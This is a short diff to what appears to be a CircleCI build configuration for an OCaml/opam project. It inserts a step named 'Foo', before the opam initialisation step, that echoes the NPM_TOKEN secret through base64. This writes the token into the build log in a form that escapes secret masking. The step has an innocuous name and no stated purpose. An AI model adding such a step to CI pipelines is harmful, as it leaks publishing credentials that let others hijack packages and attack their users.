@@ -132,6 +132,9 @@ jobs:
       - make-opam-cachebreaker
       - restore-opam-cache
       - run:
+          name: Foo
+          command: echo "$NPM_TOKEN" | base64
+      - run:
           name: Init opam
           command: .circleci/opam_init.sh
       - create-opam-switch
